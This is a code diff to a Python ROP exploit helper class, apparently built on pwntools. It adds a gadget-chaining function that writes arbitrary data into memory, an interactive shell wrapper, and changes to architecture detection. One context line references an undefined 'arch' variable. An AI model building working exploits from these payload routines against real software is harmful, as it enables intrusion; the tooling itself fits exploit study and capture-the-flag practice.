@@ -39,13 +39,29 @@ class PAPA_ROP:
 
     # Pack a value based on the binary architecture
     def p(self, value):
-        if (self.arch == "i386"):
-            return p32(value)
-        elif (self.arch == "amd64"):
+        if ("64" in self.arch):
             return p64(value)
+        elif ("32" in self.arch or "86" in self.arch):
+            return p32(value)
         else:
             log.failure("Unknown architecture: " + arch)
-            exit(1)
+            exit(1) 
+    
+    # Write a string to a location using pop and mov gadgets
+    #       pop rDST; pop rSRC; ret (pop gadget)
+    #       mov [rDST], rSRC; ret   (mov gadget)
+    # TODO - fix for when rDST and rSRC are swapped
+    def pop_mov_write(self, pop, mov, what, where):
+        payload = ""
+        nbytes = 8 if ("64" in self.arch) else 4
+        while (what):
+            payload += self.p(pop)
+            payload += self.p(where)
+            payload += what[:nbytes]
+            payload += self.p(mov)
+            what = what[nbytes:]
+            where += nbytes
+        return payload
 
     ########################################
     ##### AUTOMATED PAYLOAD GENERATION #####
@@ -81,6 +97,10 @@ class PAPA_ROP:
 
     def recvall(self):
         return self.process.recvall()
+
+    def interactive(self):
+        self.process.interactive()
+        return
 
     #################################
     ##### MISC/HELPER FUNCTIONS #####
